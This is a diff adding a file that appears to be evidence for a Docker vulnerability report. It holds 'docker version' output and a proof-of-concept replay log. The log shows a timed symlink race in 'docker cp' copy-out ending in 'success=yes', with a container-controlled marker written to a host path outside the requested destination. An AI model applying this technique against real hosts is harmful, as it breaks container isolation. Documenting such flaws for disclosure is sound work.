@@ -1,0 +1,44 @@
+Client: Docker Engine - Community
+ Version:           29.6.0
+ API version:       1.55
+ Go version:        go1.26.4
+ Git commit:        fb59821
+ Built:             Thu Jun 18 19:57:31 2026
+ OS/Arch:           linux/amd64
+ Context:           default
+
+Server: Docker Engine - Community
+ Engine:
+  Version:          29.6.0
+  API version:      1.55 (minimum version 1.40)
+  Go version:       go1.26.4
+  Git commit:       70eaf5e
+  Built:            Thu Jun 18 19:57:31 2026
+  OS/Arch:          linux/amd64
+  Experimental:     false
+ containerd:
+  Version:          v2.2.5
+  GitCommit:        e53c7c1516c3b2bff98eb76f1f4117477e6f4e66
+ runc:
+  Version:          1.3.6
+  GitCommit:        v1.3.6-0-g491b69ba
+ docker-init:
+  Version:          0.19.0
+  GitCommit:        de40ad0
+
+--- poc replay ---
+delay=0.010 cp_status=0 outside_marker=absent link=../../../dst2
+delay=0.025 cp_status=0 outside_marker=absent link=../../../dst2
+delay=0.050 cp_status=0 outside_marker=absent link=../../../dst2
+delay=0.075 cp_status=0 outside_marker=absent link=../../../dst2
+delay=0.100 cp_status=0 outside_marker=absent link=../../../dst2
+delay=0.150 cp_status=0 outside_marker=absent link=../../../dst2
+delay=0.200 cp_status=0 outside_marker=present link=../../../dst2
+success=yes
+host_base=/var/tmp/docker-cp-copyout-github
+requested_destination=/var/tmp/docker-cp-copyout-github/dst
+outside_marker_path=/var/tmp/docker-cp-copyout-github/dst2/marker
+outside_marker_value=container-controlled-host-marker
+observed_symlink=/var/tmp/docker-cp-copyout-github/dst/src/dir/zzlink -> ../../../dst2
+docker_cp_stdout=/var/tmp/docker-cp-copyout-github/docker-cp.stdout
+docker_cp_stderr=/var/tmp/docker-cp-copyout-github/docker-cp.stderr
